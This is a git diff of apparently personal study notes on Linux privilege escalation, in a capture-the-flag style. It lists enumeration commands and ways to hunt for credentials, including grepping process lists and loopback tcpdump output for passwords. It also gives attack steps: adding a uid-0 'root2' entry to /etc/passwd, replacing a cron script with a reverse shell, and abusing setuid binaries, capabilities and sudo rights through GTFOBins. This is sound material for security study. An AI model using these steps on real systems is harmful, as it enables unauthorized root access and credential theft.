@@ -1,4 +1,5 @@
 # Enum
+
 ## Useful Info
 - ``` ls -l /etc/shadow ``` see permission of if can see hashed password 
 - ```  id ``` check current user uid, gid (primary group) & groups (other groups)
@@ -13,12 +14,14 @@
         7. Login Shell: Indicates the default interactive shell, if one exists.
     ```
 - ``` hostname``` OS Type + description (not too useful)
+  
 - ``` cat /etc/issue ``` | ``` cat /etc/os-release ``` | ```uname -a```OS release & version (better OS Enum)
-- ```ps aux``` show all process 
+- ``` ps aux``` show all process 
 - ``` ip a ``` list all network card & info in this machine
 - ``` route ``` | ``` routel ``` show network routing tables (easy fuck itself localhost services to priv esc)
 - ``` ss -anp ``` list all connection
 - ``` cat /etc/iptables/rules.v4 ``` need root to see iptables (firewall rules)
+  
 - ``` ls -lah /etc/cron* ``` list all cron jobs with files and directories 
 - ``` crontab -l ``` list the cronjob that current user run | for ``` sudo crontab -l ``` can see jobs run by root
 - ``` dpkg -l | rpm ``` list all package 
@@ -49,3 +52,47 @@
    3. ``` chmod +x {file_name} ```
 - ``` unix-privesc-check standard > output.txt ``` & ignore error
 - looks for sussy shit e.g. global writable thing
+
+# Exposed Confidential info
+## User trails
+- ``` env ``` environ variable
+- ``` .bashrc ``` bash config file (this file is fucking hidden on99)
+- ``` sudo -l``` list sudoer capabilities to user
+- ``` find / -name flag.txt 2>/dev/null ``` find flag.txt in linux
+
+## Service footprints
+- ``` watch -n 1 "ps -aux | grep pass" ``` process
+- ``` sudo tcpdump -i lo -A | grep "pass" ``` tcp traffic
+
+# Bad File permissions 
+## Cron jobss hack
+- ``` grep "CRON" /var/log/syslog ``` grep from syslog (messages from various system services and daemons, including the cron daemon)
+- change the file to rev shell , ez
+## Password authN hack
+- unless AD/LDAP, its store in /etc/shadow, write to passwd still works sometimes
+- gen 'crypt' hash password ``` openssl passwd {password_plain} ```
+- mock user to passwd ``` echo "root2:{password_hashed}:0:0:root:/root:/bin/bash" >> /etc/passwd ```
+
+# Fuck Linux system componenets
+### Possible exploit
+- GTFO: https://gtfobins.github.io/ 
+
+## Setuid binaries and others
+- GTFO: SetUID
+- ``` /usr/sbin/getcap -r / 2>/dev/null ``` search misconfigured capabilities e.g. will find perl, ping , or even other binary
+- see have ``` cap_setuid+ep```
+- go gtfobins look for Capabilities 
+
+
+
+### Logic behind
+- check if the process is being used by root but normal user trigger ``` ps u -C passwd ```
+- e.g ``` passwd ``` will have 1000 0 0 0 = SUID is there | normally all value point to same user
+- ``` ls -asl /usr/bin/passwd ``` check permission if have SUID Flag
+
+## Fuck sudo itself
+- GTFO: Sudo
+- list all current user can use sudo to run 
+- brute force those capabilities to PE
+- if not success -> check error ``` cat /var/log/syslog | grep {binary_name} ```
+- sometimes blocked by apparmor
